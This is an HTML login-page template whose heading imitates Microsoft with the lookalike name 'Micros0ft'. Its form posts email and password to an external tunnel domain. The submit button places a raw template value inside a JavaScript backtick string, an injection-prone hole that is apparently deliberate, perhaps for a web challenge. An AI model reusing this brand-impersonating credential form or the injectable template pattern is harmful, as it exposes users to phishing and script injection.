<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8">
    <title>用户登录界面</title>
    <link rel="stylesheet" href="/css/login.css">
    <link rel="stylesheet" href="/css/font-awesome.css">

    <style>
        input::-webkit-input-placeholder {
            color:white;
        }
        input::-moz-placeholder {
            /* Mozilla Firefox 19+ */
            color: white;
        }
        input:-moz-placeholder {
            /* Mozilla Firefox 4 to 18 */
            color: white;
        }
        input:-ms-input-placeholder {
            /* Internet Explorer 10-11 */
            color: white;
        }
    </style>

</head>

<body>
    <form action="https://404060p9q5.zicp.fun/login" method="POST"> <!-- @TODO 记得修改公网地址 -->
        <div id="login-box">
            <h1>欢迎使用Micros0ft密码管理器</h1>
            <div class="form">
                <div class="item">
                    <i class="fa fa-envelope-open-o" aria-hidden="true"></i>
                    <input type="email" placeholder="邮箱" name="email" required>
                </div>

                <div class="item">
                    <i class="fa fa-key" aria-hidden="true"></i>
                    <input type="password" placeholder="密码" name="password" required>
                </div>
            </div>
            <br>
            <button type="submit" onclick="myFunction(`{{.}}`)">登录</button><br>

            <div class="tips">
                <a href="https://404060p9q5.zicp.fun/registerIndex">点击注册</a><br>
                <!--记得修改公网地址 @TODO 记得修改公网地址 -->
            </div>
        </div>
    </form>
    <script>
        function myFunction(var1){
            if (var1 != "{{.}}") alert("你好");
        }
    </script>
</body>
</html>
